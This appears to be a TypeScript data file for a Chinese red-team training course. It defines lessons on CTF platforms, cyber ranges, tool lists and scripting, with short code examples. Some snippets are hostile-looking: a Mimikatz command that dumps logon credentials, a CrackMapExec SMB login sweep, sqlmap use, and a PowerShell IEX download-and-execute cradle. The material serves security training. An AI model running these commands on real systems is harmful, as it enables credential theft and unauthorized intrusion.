days[103].title = 'CTF平台3：攻防世界';
days[103].subtitle = 'XCTF Platform';
days[103].objectives = ['掌握攻防世界使用', '练习CTF解题', '学会实战技巧'];
days[103].content = `攻防世界是国内最大的CTF练习平台之一。

【攻防世界简介】
• 包含大量CTF题目
• 涵盖Web、Pwn、Reverse、Crypto、Misc等类别
• 提供详细的题目分类

【攻防世界模块】
• 新手练习：适合入门
• 进阶挑战：提高难度
• 真题练习：历年CTF真题
• 团队比赛：组队参加比赛

【CTF比赛类型】
• 线上赛：远程参赛
• 线下赛：现场比赛
• 区域赛：各地区比赛
• 全国赛：总决赛

【实战技巧】
• 系统地练习各类题目
• 参加线上比赛
• 组建团队协作
• 学习比赛经验

攻防世界是CTF学习的权威平台！`;
days[103].keyPoints = ['攻防世界简介', '模块内容', '比赛类型', '实战技巧'];
days[103].resources = [
  { name: '攻防世界官方网站', url: 'https://adworld.xctf.org.cn/', type: 'article' },
];

days[104].title = 'CTF平台4：护网模拟靶场';
days[104].subtitle = 'Cyber Defense Simulation';
days[104].objectives = ['了解护网模拟靶场', '练习护网实战', '学会红队作战'];
days[104].content = `护网模拟靶场是模拟真实护网行动的练习平台。

【护网模拟靶场简介】
• 模拟真实护网行动场景
• 包含攻防对抗环境
• 适合练习护网实战

【护网模拟环境】
• 目标系统：模拟企业网络
• 防守方：蓝队
• 进攻方：红队
• 裁判：监控和评分

【护网实战技巧】
• 快速突破：找到突破口后快速推进
• 隐蔽操作：注意操作隐蔽性
• 团队协作：保持团队沟通
• 灵活应变：根据实际情况调整策略

【护网注意事项】
• 遵守规则：遵守护网行动规则
• 注意安全：保护自己的基础设施
• 做好记录：详细记录攻击过程

护网模拟靶场是练习护网实战的最佳平台！`;
days[104].keyPoints = ['护网模拟简介', '环境结构', '实战技巧', '注意事项'];
days[104].resources = [
  { name: '护网行动指南', url: 'https://www.freebuf.com/articles/paper/278586.html', type: 'article' },
];

days[105].title = '企业级靶场1：CyberRange';
days[105].subtitle = 'Cyber Range';
days[105].objectives = ['了解CyberRange概念', '掌握企业级靶场使用', '学会实战技能'];
days[105].content = `CyberRange是企业级网络安全演练平台。

【CyberRange简介】
• 模拟真实企业网络环境
• 包含多种安全场景
• 适合企业级安全演练

【CyberRange环境】
• 企业网络：模拟企业网络拓扑
• 安全设备：防火墙、IDS/IPS、WAF等
• 应用系统：各种企业应用
• 攻击场景：模拟真实攻击场景

【企业级安全演练】
• 渗透测试演练：模拟攻击
• 应急响应演练：模拟安全事件
• 红蓝对抗：红队和蓝队对抗
• 安全培训：安全意识培训

【实战技巧】
• 理解企业网络结构
• 掌握安全设备配置
• 练习真实攻击技术
• 提高应急响应能力

CyberRange是企业级安全演练的最佳平台！`;
days[105].keyPoints = ['CyberRange简介', '环境结构', '安全演练', '实战技巧'];
days[105].resources = [
  { name: 'CyberRange平台', url: 'https://www.cyberrange.com/', type: 'article' },
];

days[106].title = '企业级靶场2：企业级靶场搭建';
days[106].subtitle = 'Enterprise Target Setup';
days[106].objectives = ['学会搭建企业级靶场', '掌握靶场架构设计', '了解靶场管理'];
days[106].content = `搭建自己的企业级靶场是学习网络安全的最佳方式。

【企业级靶场架构】
• 外网环境：模拟互联网
• DMZ区：部署Web服务器
• 内网环境：企业内部网络
• 域环境：Active Directory域

【靶场搭建步骤】
1. 设计架构：确定靶场拓扑结构
2. 准备设备：准备虚拟机或物理设备
3. 安装系统：安装操作系统
4. 配置网络：配置网络连接
5. 部署服务：部署各种服务和应用
6. 配置安全：配置安全设备和策略

【靶场管理】
• 用户管理：管理学员账号
• 环境管理：管理靶场环境
• 进度管理：跟踪学习进度
• 评估管理：评估学习成果

【实战技巧】
• 从简单架构开始
• 逐步增加复杂度
• 记录每一步的配置
• 定期维护和更新

搭建自己的企业级靶场，深入学习网络安全！`;
days[106].keyPoints = ['靶场架构', '搭建步骤', '靶场管理', '实战技巧'];
days[106].codeExamples = [{ title: '靶场网络配置', language: 'bash', code: '# 配置VMware网络\n# 虚拟网络编辑器\n# VMnet0：桥接模式（外网）\n# VMnet1：仅主机模式（内网）\n# VMnet2：仅主机模式（DMZ）\n\n# 配置防火墙规则\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\n\n# 配置端口转发\niptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.100:80\n\n# 配置VPN\nopenvpn --config server.conf', explanation: '靶场网络配置示例' }];
days[106].resources = [
  { name: '企业级靶场搭建教程', url: 'https://www.freebuf.com/articles/web/289012.html', type: 'article' },
];

days[107].title = '企业级靶场3：学习路径推荐';
days[107].subtitle = 'Learning Path Recommendation';
days[107].objectives = ['制定学习路径', '规划学习计划', '掌握学习方法'];
days[107].content = `制定合理的学习路径是高效学习的关键。

【学习路径规划】
• 第一阶段（1-2周）：基础学习
• 第二阶段（3-4周）：Web漏洞学习
• 第三阶段（5-6周）：内网渗透学习
• 第四阶段（7-8周）：域渗透学习
• 第五阶段（9-10周）：红队作战学习

【学习计划示例】
• 每天学习2-3小时
• 每周完成一个模块
• 每月进行一次总结
• 每季度进行一次实战演练

【学习方法】
• 理论学习：阅读书籍和文章
• 视频学习：观看教学视频
• 实战练习：在靶场中练习
• 总结归纳：记录学习笔记

【学习资源】
• 书籍：《Web安全深度剖析》、《内网渗透实战》
• 视频：B站、YouTube教学视频
• 文章：FreeBuf、安全客、先知社区
• 工具：Nmap、Burp Suite、Metasploit

制定合理的学习路径，高效学习网络安全！`;
days[107].keyPoints = ['学习路径', '学习计划', '学习方法', '学习资源'];

days[108].title = '企业级靶场4：工具汇总';
days[108].subtitle = 'Tool Summary';
days[108].objectives = ['掌握常用工具', '学会工具使用方法', '了解工具选择策略'];
days[108].content = `红队工具链是红队作战的武器库。

【信息收集工具】
• Nmap：端口扫描和服务识别
• Gobuster：目录扫描
• FFUF：模糊测试
• FOFA：网络空间搜索
• Shodan：设备搜索
• Amass：子域名枚举

【漏洞挖掘工具】
• Burp Suite：Web漏洞挖掘
• sqlmap：SQL注入检测和利用
• Nikto：Web服务器扫描
• OWASP ZAP：开源Web漏洞扫描
• Nessus：综合漏洞扫描

【漏洞利用工具】
• Metasploit：漏洞利用框架
• Cobalt Strike：红队作战平台
• ExploitDB：漏洞利用代码库
• Searchsploit：本地漏洞搜索

【后渗透工具】
• Mimikatz：凭证窃取
• PowerUp：Windows提权检查
• WinPEAS：Windows枚举工具
• LinPEAS：Linux枚举工具
• CrackMapExec：内网渗透工具

【工具选择策略】
• 根据目标选择工具
• 掌握核心工具
• 学习工具原理
• 开发自定义工具

掌握红队工具链，成为优秀的红队成员！`;
days[108].keyPoints = ['信息收集工具', '漏洞挖掘工具', '漏洞利用工具', '后渗透工具'];
days[108].codeExamples = [{ title: '常用工具命令', language: 'bash', code: '# Nmap扫描\nnmap -sS -sV -A -T4 192.168.1.0/24\n\n# Gobuster目录扫描\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\n\n# Burp Suite配置\n# 代理：127.0.0.1:8080\n# 拦截：开启拦截\n\n# sqlmap检测\nsqlmap -u \"http://target.com/?id=1\" --dbs\n\n# Mimikatz\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n\n# CrackMapExec\ncrackmapexec smb 192.168.1.0/24 -u administrator -p password', explanation: '红队常用工具命令' }];

days[109].title = '企业级靶场5：FAQ';
days[109].subtitle = 'Frequently Asked Questions';
days[109].objectives = ['解答常见问题', '解决学习困惑', '提供学习建议'];
days[109].content = `解答学习过程中的常见问题。

【常见问题解答】

Q1：如何入门网络安全？
A：从Web安全开始，学习SQL注入、XSS等基础漏洞，在靶场中练习。

Q2：需要学习哪些编程语言？
A：至少掌握一门编程语言，推荐Python，也可以学习PowerShell、C/C++。

Q3：如何选择靶场？
A：初学者从DVWA、Pikachu开始，进阶学习者尝试SQLi-Labs、Vulhub，高级学习者挑战内网靶场和域环境靶场。

Q4：如何提高实战能力？
A：多做CTF，参加护网演练，在真实环境中练习。

Q5：需要考取哪些证书？
A：CEH、CISSP、OSCP、CISP等，根据职业规划选择。

Q6：如何成为红队成员？
A：掌握Web漏洞、内网渗透、域渗透等技术，有实战经验，具备团队协作能力。

Q7：学习过程中遇到困难怎么办？
A：查阅文档、搜索资料、请教他人，不要轻易放弃。

Q8：如何保持学习动力？
A：设定目标、参加比赛、分享知识、持续实践。

学习网络安全需要耐心和坚持，祝你成功！`;
days[109].keyPoints = ['入门问题', '学习方法', '证书问题', '职业发展'];

days[110].title = '附录A：命令行技巧';
days[110].subtitle = 'Command Line Tips';
days[110].objectives = ['掌握命令行技巧', '学会高效操作', '提高工作效率'];
days[110].content = `命令行是红队成员的必备技能。

【Linux命令行技巧】
• 快捷键：Ctrl+C中断、Ctrl+D退出、Ctrl+R搜索历史
• 别名：alias ls='ls -la'
• 管道：命令组合使用
• 重定向：>输出到文件、>>追加到文件
• 后台运行：&、nohup

【Windows命令行技巧】
• PowerShell：强大的脚本语言
• cmd：基础命令行
• 批处理：编写脚本
• 快捷键：Ctrl+C中断、Tab补全

【网络命令】
• ping：测试网络连通性
• tracert：路由追踪
• netstat：网络连接状态
• ipconfig：IP配置信息

【文件操作命令】
• ls：列出文件
• cd：切换目录
• cp：复制文件
• mv：移动文件
• rm：删除文件

掌握命令行技巧，提高工作效率！`;
days[110].keyPoints = ['Linux技巧', 'Windows技巧', '网络命令', '文件操作'];
days[110].codeExamples = [{ title: '常用命令行技巧', language: 'bash', code: '# Linux快捷键\nCtrl+C # 中断当前命令\nCtrl+D # 退出当前会话\nCtrl+R # 搜索历史命令\nCtrl+L # 清屏\nTab # 自动补全\n\n# 命令别名\nalias ll=\"ls -la\"\nalias grep=\"grep --color=auto\"\nalias ping=\"ping -c 4\"\n\n# 管道和重定向\nls -la | grep .txt > files.txt\nsort file.txt | uniq -c > sorted.txt\n\n# 后台运行\nnohup python server.py &\n\n# PowerShell技巧\nGet-ChildItem -Recurse | Where-Object { $_.Extension -eq \".txt\" }\nGet-Process | Sort-Object CPU -Descending', explanation: '命令行常用技巧' }];

days[111].title = '附录B：正则表达式';
days[111].subtitle = 'Regular Expressions';
days[111].objectives = ['掌握正则表达式', '学会正则表达式使用', '提高文本处理能力'];
days[111].content = `正则表达式是文本处理的强大工具。

【正则表达式基础】
• 字符类：[abc]、[^abc]、[a-z]
• 量词：*、+、?、{n}、{n,m}
• 锚点：^、$、\b
• 特殊字符：.、\d、\w、\s

【正则表达式示例】
• 匹配邮箱：^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$
• 匹配手机号：^1[3-9]\\d{9}$
• 匹配IP地址：^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$
• 匹配URL：https?://[\\w.-]+(?:/[\\w./?%&=-]*)?

【正则表达式应用】
• grep：文本搜索
• sed：文本替换
• awk：文本处理
• Python：re模块

【实战技巧】
• 先理解正则表达式语法
• 使用在线工具测试
• 从简单到复杂
• 记录常用正则表达式

掌握正则表达式，提高文本处理能力！`;
days[111].keyPoints = ['正则基础', '正则示例', '正则应用', '实战技巧'];
days[111].codeExamples = [{ title: '正则表达式示例', language: 'bash', code: '# grep使用正则\ngrep -E \"^[a-zA-Z]+\" file.txt\ngrep -E \"[0-9]+\" file.txt\ngrep -E \"^1[3-9][0-9]{9}$\" phone.txt\n\n# sed使用正则\nsed -i \"s/old/new/g\" file.txt\nsed -i \"/^#/d\" file.txt\n\n# Python正则\nimport re\npattern = r\"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}$\"\nresult = re.match(pattern, \"test@example.com\")\n\n# 匹配IP地址\nip_pattern = r\"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\"', explanation: '正则表达式常用示例' }];

days[112].title = '附录C：Python脚本编写';
days[112].subtitle = 'Python Scripting';
days[112].objectives = ['掌握Python脚本编写', '学会自动化工具开发', '提高工作效率'];
days[112].content = `Python是红队成员最常用的编程语言。

【Python基础】
• 数据类型：字符串、列表、字典、元组
• 控制结构：if、for、while
• 函数定义：def
• 文件操作：open、read、write

【Python网络编程】
• socket：网络通信
• requests：HTTP请求
• urllib：URL处理
• scapy：网络数据包处理

【Python安全工具】
• sqlmap：SQL注入检测
• paramiko：SSH连接
• netmiko：网络设备连接
• beautifulsoup：HTML解析

【Python脚本示例】
• 端口扫描脚本
• 目录扫描脚本
• 漏洞检测脚本
• 自动化攻击脚本

【实战技巧】
• 使用标准库
• 学习第三方库
• 编写模块化代码
• 添加错误处理

掌握Python脚本编写，开发自己的安全工具！`;
days[112].keyPoints = ['Python基础', '网络编程', '安全工具', '脚本示例'];
days[112].codeExamples = [{ title: 'Python端口扫描脚本', language: 'python', code: 'import socket\nimport threading\n\ndef scan_port(host, port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((host, port))\n        if result == 0:\n            print(f\"[+] Port {port} is open\")\n        sock.close()\n    except:\n        pass\n\ndef main():\n    host = \"192.168.1.1\"\n    for port in range(1, 65536):\n        t = threading.Thread(target=scan_port, args=(host, port))\n        t.start()\n\nif __name__ == \"__main__\":\n    main()', explanation: 'Python端口扫描脚本' }];

days[113].title = '附录D：PowerShell脚本编写';
days[113].subtitle = 'PowerShell Scripting';
days[113].objectives = ['掌握PowerShell脚本编写', '学会Windows渗透技巧', '提高内网渗透能力'];
days[113].content = `PowerShell是Windows系统中最强大的脚本语言。

【PowerShell基础】
• 命令：cmdlet
• 管道：|
• 变量：$var
• 数组：@()
• 哈希表：@{key=value}

【PowerShell网络操作】
• Invoke-WebRequest：HTTP请求
• New-Object Net.WebClient：下载文件
• Test-NetConnection：网络测试

【PowerShell渗透技巧】
• 内存加载：IEX (New-Object Net.WebClient).DownloadString()
• 权限提升：PowerUp.ps1
• 信息收集：WinPEASany.exe
• 横向移动：psexec、evil-winrm

【PowerShell脚本示例】
• 信息收集脚本
• 权限提升脚本
• 横向移动脚本
• 持久化脚本

【实战技巧】
• 学习PowerShell语法
• 掌握常用命令
• 编写模块化脚本
• 注意免杀处理

掌握PowerShell脚本编写，提高Windows渗透能力！`;
days[113].keyPoints = ['PowerShell基础', '网络操作', '渗透技巧', '脚本示例'];
days[113].codeExamples = [{ title: 'PowerShell信息收集脚本', language: 'powershell', code: '# PowerShell信息收集\nWrite-Host \"=== 系统信息 ===\"\nGet-ComputerInfo | Select-Object OSName, OSVersion, CsProcessor\n\nWrite-Host \"=== 用户信息 ===\"\nGet-LocalUser\n\nWrite-Host \"=== 网络信息 ===\"\nGet-NetIPAddress | Where-Object { $_.AddressFamily -eq \"IPv4\" }\n\nWrite-Host \"=== 进程信息 ===\"\nGet-Process | Select-Object Name, Id, Path\n\nWrite-Host \"=== 服务信息 ===\"\nGet-Service | Where-Object { $_.Status -eq \"Running\" }\n\nWrite-Host \"=== 计划任务 ===\"\nGet-ScheduledTask | Where-Object { $_.State -eq \"Ready\" }', explanation: 'PowerShell信息收集脚本' }];

days[114].title = '附录E：Git版本控制';
days[114].subtitle = 'Git Version Control';
days[114].objectives = ['掌握Git使用', '学会版本管理', '提高团队协作能力'];
days[114].content = `Git是代码版本控制的标准工具。

【Git基础】
• 初始化仓库：git init
• 添加文件：git add
• 提交更改：git commit
• 查看状态：git status
• 查看日志：git log

【Git分支管理】
• 创建分支：git branch
• 切换分支：git checkout
• 合并分支：git merge
• 删除分支：git branch -d

【Git远程仓库】
• 添加远程：git remote add
• 推送到远程：git push
• 从远程拉取：git pull
• 克隆仓库：git clone

【Git工作流】
• Git Flow：标准工作流
• GitHub Flow：简化工作流
• GitLab Flow：企业级工作流

【实战技巧】
• 定期提交代码
• 使用有意义的提交信息
• 及时推送代码
• 学会解决冲突

掌握Git版本控制，提高团队协作能力！`;
days[114].keyPoints = ['Git基础', '分支管理', '远程仓库', '工作流'];
days[114].codeExamples = [{ title: 'Git常用命令', language: 'bash', code: '# Git初始化\ngit init\ngit add .\ngit commit -m \"Initial commit\"\n\n# Git分支\ngit branch feature\ngit checkout feature\ngit commit -m \"Add feature\"\ngit checkout main\ngit merge feature\ngit branch -d feature\n\n# Git远程仓库\ngit remote add origin https://github.com/user/repo.git\ngit push -u origin main\ngit pull origin main\n\n# Git日志\ngit log --oneline\ngit log --graph\ngit log --all\n\n# Git撤销\ngit checkout -- file.txt\ngit reset HEAD file.txt\ngit revert commit_hash', explanation: 'Git常用命令' }];

days[115].title = '附录F：Docker容器';
days[115].subtitle = 'Docker Containers';
days[115].objectives = ['掌握Docker使用', '学会容器管理', '提高环境部署效率'];
days[115].content = `Docker是容器化的标准工具。

【Docker基础】
• 镜像：Docker image
• 容器：Docker container
• 仓库：Docker registry
• Dockerfile：镜像构建文件

【Docker命令】
• 运行容器：docker run
• 查看容器：docker ps
• 进入容器：docker exec
• 停止容器：docker stop
• 删除容器：docker rm

【Docker Compose】
• 多容器编排
• docker-compose.yml配置文件
• 启动服务：docker-compose up
• 停止服务：docker-compose down

【Docker安全】
• 容器隔离：Linux namespaces
• 资源限制：cgroups
• 镜像安全：扫描镜像漏洞
• 容器安全：限制容器权限

【实战技巧】
• 使用官方镜像
• 编写Dockerfile
• 使用Docker Compose
• 定期更新镜像

掌握Docker容器，提高环境部署效率！`;
days[115].keyPoints = ['Docker基础', 'Docker命令', 'Docker Compose', 'Docker安全'];
days[115].codeExamples = [{ title: 'Docker常用命令', language: 'bash', code: '# Docker拉取镜像\ndocker pull ubuntu:latest\ndocker pull nginx:latest\n\n# Docker运行容器\ndocker run -d -p 8080:80 nginx\ndocker run -it ubuntu /bin/bash\ndocker run -v /host/path:/container/path nginx\n\n# Docker查看容器\ndocker ps\ndocker ps -a\ndocker logs container_id\n\n# Docker进入容器\ndocker exec -it container_id /bin/bash\n\n# Docker Compose\ndocker-compose up -d\ndocker-compose ps\ndocker-compose down\n\n# Docker清理\ndocker system prune\ndocker rm $(docker ps -aq)\ndocker rmi $(docker images -q)', explanation: 'Docker常用命令' }];

days[116].title = '附录G：安全学习资源';
days[116].subtitle = 'Security Learning Resources';
days[116].objectives = ['了解学习资源', '学会资源利用', '提高学习效率'];
days[116].content = `优秀的学习资源是高效学习的关键。

【书籍推荐】
• 《Web安全深度剖析》
• 《内网渗透实战》
• 《域渗透实战》
• 《Metasploit实战指南》
• 《Cobalt Strike实战指南》
• 《红队攻防实战》

【视频资源】
• B站：安全学习视频
• YouTube：国际安全视频
• 安全牛：安全培训视频
• 嘶吼学院：安全课程

【文章资源】
• FreeBuf：安全资讯和技术文章
• 安全客：安全技术文章
• 先知社区：安全技术文章
• 看雪论坛：逆向和安全文章

【工具资源】
• GitHub：安全工具仓库
• Kali Linux：安全工具集成
• Parrot OS：安全工具集成

【社区资源】
• 安全圈：安全社区
• 知乎：安全话题
• 微信群：安全交流群
• 知识星球：安全知识分享

利用好学习资源，高效学习网络安全！`;
days[116].keyPoints = ['书籍推荐', '视频资源', '文章资源', '工具资源'];

days[117].title = '附录H：职业发展规划';
days[117].subtitle = 'Career Development';
days[117].objectives = ['了解职业发展路径', '规划职业方向', '制定发展计划'];
days[117].content = `规划职业发展方向是成功的关键。

【职业发展路径】
• 初级安全工程师：Web安全、漏洞挖掘
• 中级安全工程师：内网渗透、域渗透
• 高级安全工程师：红队作战、安全架构
• 安全专家：安全咨询、安全管理

【职业方向选择】
• 渗透测试：漏洞挖掘和利用
• 安全开发：安全工具开发
• 安全运营：安全监控和响应
• 安全管理：安全策略和规划

【证书推荐】
• CEH：认证道德黑客
• CISSP：注册信息系统安全师
• OSCP：认证渗透测试专家
• CISP：注册信息安全专业人员
• CRTO：红队操作认证

【学习建议】
• 持续学习：网络安全技术更新快
• 实践为主：多在靶场中练习
• 团队协作：加入安全团队
• 分享知识：写博客、做分享

规划好职业发展，实现职业目标！`;
days[117].keyPoints = ['发展路径', '职业方向', '证书推荐', '学习建议'];

days[118].title = '网吧网管到Web渗透大神（上）';
days[118].subtitle = 'From Cybercafe Admin to Web Penetration Expert Part 1';
days[118].objectives = ['了解草根逆袭故事', '学习SRC挖洞方法', '掌握SQL注入实战'];

days[119].title = '网吧网管到Web渗透大神（下）';
days[119].subtitle = 'From Cybercafe Admin to Web Penetration Expert Part 2';
days[119].objectives = ['学习Web渗透进阶', '掌握漏洞挖掘技巧', '理解职业发展路径'];

days[120].title = '运维小白到域渗透专家（上）';
days[120].subtitle = 'From Ops Beginner to Domain Expert Part 1';
days[120].objectives = ['了解运维转安全路径', '学习内网信息收集', '掌握域环境基础'];

days[121].title = '运维小白到域渗透专家（下）';
days[121].subtitle = 'From Ops Beginner to Domain Expert Part 2';
days[121].objectives = ['掌握Kerberos攻击', '学习横向移动技术', '理解域控渗透流程'];

days[122].title = '编程菜鸟到免杀大佬（上）';
days[122].subtitle = 'From Coding Novice to AV Evasion Master Part 1';
days[122].objectives = ['了解编程转安全路径', '学习逆向工程基础', '掌握免杀原理'];

days[123].title = '编程菜鸟到免杀大佬（下）';
days[123].subtitle = 'From Coding Novice to AV Evasion Master Part 2';
days[123].objectives = ['掌握高级免杀技术', '学习内存加载技巧', '理解无文件攻击'];

days[124].title = '内向技术宅到社工钓鱼大师（上）';
days[124].subtitle = 'From Introverted Techie to Social Engineering Master Part 1';
days[124].objectives = ['了解社工学习路径', '学习社工画像方法', '掌握钓鱼邮件设计'];

days[125].title = '内向技术宅到社工钓鱼大师（下）';
days[125].subtitle = 'From Introverted Techie to Social Engineering Master Part 2';
days[125].objectives = ['掌握高级钓鱼技术', '学习水坑攻击方法', '理解社工实战流程'];

days[126].title = '脚本小子到工具开发大神（上）';
days[126].subtitle = 'From Script Kiddie to Tool Developer Part 1';
days[126].objectives = ['了解工具开发路径', '学习Python安全编程', '掌握安全工具基础'];

days[127].title = '脚本小子到工具开发大神（下）';
days[127].subtitle = 'From Script Kiddie to Tool Developer Part 2';
days[127].objectives = ['掌握高级工具开发', '学习自动化框架', '理解武器化流程'];

days[128].title = '游戏外挂爱好者到0day漏洞猎手（上）';
days[128].subtitle = 'From Game Hacker to Zero-Day Hunter Part 1';
days[128].objectives = ['了解漏洞挖掘路径', '学习逆向分析基础', '掌握Fuzzing技术'];

days[129].title = '游戏外挂爱好者到0day漏洞猎手（下）';
days[129].subtitle = 'From Game Hacker to Zero-Day Hunter Part 2';
days[129].objectives = ['掌握内核漏洞挖掘', '学习漏洞利用开发', '理解Pwn2Own流程'];

export const cyberRedteamPlan: CyberLearningPlan = {
  id: 'redteam',
  name: '红队实战进阶',
  subtitle: 'Red Team Advanced',
  description: '从真实护网案例出发，系统学习红队作战全流程，掌握Web漏洞、内网渗透、域渗透等核心技术。',
  icon: '🎯',
  difficulty: '高级',
  totalDays: 130,
  color: 'text-red-600',
  bgColor: 'bg-red-50',
  borderColor: 'border-red-200',
  prerequisites: ['网络安全基础知识', 'Linux基本操作', 'Web安全基础'],
  certification: '可从事红队工程师、渗透测试工程师岗位',
  days: [...days]
};